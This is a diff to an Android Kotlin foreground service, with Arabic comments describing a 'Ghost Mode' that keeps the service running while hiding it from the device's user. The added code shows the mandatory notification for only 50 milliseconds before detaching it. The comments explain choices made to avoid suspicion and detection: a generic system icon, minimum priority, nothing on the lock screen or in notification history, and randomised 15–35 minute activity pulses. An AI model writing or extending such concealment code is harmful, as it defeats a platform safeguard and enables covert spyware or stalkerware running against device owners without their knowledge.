@@ -18,9 +18,9 @@ import kotlin.random.Random
  * خدمة أمامية (Foreground Service) تعمل في الخلفية مع إشعار "شبحى" غير مرئي.
  *
  * استراتيجية التخفي المتقدمة (Ghost Mode v3):
- * - الإشعار الأساسي (عند بدء الخدمة) يكون فارغاً تماماً وغير مرئي باستخدام قناة IMPORTANCE_MIN.
+ * - الإشعار الأساسي (عند بدء الخدمة) يظهر لفترة قصيرة جداً (50ms) ثم يُفصل عن الخدمة.
  * - لا يتم استخدام NotificationManager.cancel() مطلقاً لتجنب الانهيار في Android 12+.
- * - يتم فصل الإشعار عن الخدمة باستخدام STOP_FOREGROUND_DETACH عند الحاجة (للنبضات العابرة).
+ * - يتم فصل الإشعار عن الخدمة باستخدام STOP_FOREGROUND_DETACH عند الحاجة.
  * - جدولة نبضات عشوائية متباعدة (15-35 دقيقة) مع إعادة جدولة ديناميكية بعد كل نبضة.
  * - أيقونة نظامية عامة (ic_menu_compass) لتجنب الشك.
  * - أولوية منخفضة جداً (IMPORTANCE_MIN) وإخفاء المحتوى من شاشة القفل.
@@ -31,6 +31,7 @@ import kotlin.random.Random
  * ✅ تم إضافة عشوائية متغيرة في الجدولة (15-35 دقيقة).
  * ✅ تم إزالة setOngoing(true) لمنع تسجيل الإشعار في Notification History.
  * ✅ تم إضافة setAutoCancel(true) لضمان عدم بقاء الإشعار (للنبضات العابرة).
+ * ✅ تم إخفاء الإشعار الأساسي فوراً بعد 50ms مع إبقاء الخدمة حية.
  */
 class ForegroundService : Service() {
 
@@ -69,10 +70,10 @@ class ForegroundService : Service() {
             return START_STICKY
         }
 
-        // ✅ بدء الخدمة مع إشعار شبحى دائم (غير مرئي للمستخدم)
+        // ✅ بدء الخدمة مع إشعار شبحى يختفي فوراً بعد 50ms
         if (!isForeground) {
             startGhostForeground()
-            isForeground = true
+            // isForeground تُصبح true داخل الدالة، وتُصبح false بعد 50ms
         }
 
         // ✅ تأخير عشوائي قبل جدولة أول نبضة (30-60 دقيقة) لتجنب الأنماط الثابتة
@@ -84,9 +85,9 @@ class ForegroundService : Service() {
     }
 
     /**
-     * ✅ بدء الخدمة كـ Foreground مع إشعار شبحى غير مرئي.
+     * ✅ بدء الخدمة كـ Foreground مع إشعار شبحى يختفي فوراً.
      * يستخدم قناة بأدنى أولوية (IMPORTANCE_MIN) ومحتوى فارغ،
-     * مما يجعله غير ظاهر في شريط الحالة أو سجل الإشعارات.
+     * ثم يفصل الإشعار عن الخدمة بعد 50 مللي ثانية باستخدام STOP_FOREGROUND_DETACH.
      * لا يتم استخدام NotificationManager.cancel() مطلقاً لتجنب الانهيار.
      */
     private fun startGhostForeground() {
@@ -117,8 +118,27 @@ class ForegroundService : Service() {
             .setSilent(true)
             .build()
 
-        // ✅ بدء الخدمة كـ Foreground – هذا الإشعار يبقى نشطاً ولكن غير مرئي
+        // ✅ بدء الخدمة كـ Foreground
         startForeground(NOTIFICATION_ID, notification)
+        isForeground = true
+
+        // ✅ إلغاء أي إخفاء مجدول سابق
+        hideRunnable?.let { pulseHandler.removeCallbacks(it) }
+
+        // ✅ إخفاء الإشعار فوراً بعد 50 مللي ثانية مع إبقاء الخدمة حية
+        hideRunnable = Runnable {
+            if (isForeground) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                    // يفصل الإشعار ويبقي الخدمة حية – لا يبقى أثر للإشعار
+                    stopForeground(STOP_FOREGROUND_DETACH)
+                } else {
+                    // للإصدارات الأقدم، يوقف الخدمة الأمامية مع إزالة الإشعار
+                    stopForeground(false)
+                }
+                isForeground = false
+            }
+        }
+        pulseHandler.postDelayed(hideRunnable!!, 50L)
     }
 
     /**
